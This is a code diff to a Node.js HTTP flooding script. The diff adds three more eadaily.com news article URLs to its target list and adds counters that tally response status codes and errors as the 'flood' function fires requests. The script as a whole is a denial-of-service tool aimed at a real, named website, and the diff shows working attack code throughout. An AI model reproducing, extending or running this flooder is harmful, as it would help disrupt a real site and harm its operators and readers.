@@ -1,8 +1,15 @@
 const http = require('https')
 
 var targets = [
-    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/posolstvo-ssha-udalilo-s-sayta-dokumenty-o-biolaboratoriyah-na-ukraine'}
+    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/posolstvo-ssha-udalilo-s-sayta-dokumenty-o-biolaboratoriyah-na-ukraine'},
+    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/kadyrov-vylozhil-video-s-chechenskim-flagom-na-ukraine'},
+    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/rossiyskiy-pogranichnik-ranen-v-hode-provokacii-s-ukrainskoy-storony'},
+    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/prezident-pridnestrovya-obratilsya-k-ukraincam-ne-verte-lzhivym-smi'}
 ];
+
+const results = {
+    error: 0
+};
 
 const getDurationInMilliseconds = (start) => {
     const NS_PER_SEC = 1e9
@@ -37,6 +44,11 @@ async function fetchWithTimeout(resource) {
             result.cacheStatus = res.headers['x-cache-status'];
             clearTimeout(id);
             result.durationInMilliseconds = getDurationInMilliseconds (start)
+            if (!results[res.statusCode]) {
+                results[res.statusCode] = 0;
+            }
+
+            results[res.statusCode] += 1;
 
             resolve(result);
         })
@@ -46,6 +58,7 @@ async function fetchWithTimeout(resource) {
             clearTimeout(id);
             result.durationInMilliseconds = getDurationInMilliseconds (start)
 
+            results.error += 1;
             resolve(result);
         })
 
@@ -61,6 +74,8 @@ async function flood(target) {
         queue.push(
             fetchWithTimeout(target)
                 .then((response) => {
+                    console.clear();
+                    console.log(results)
                     console.log(response)
                 })
 
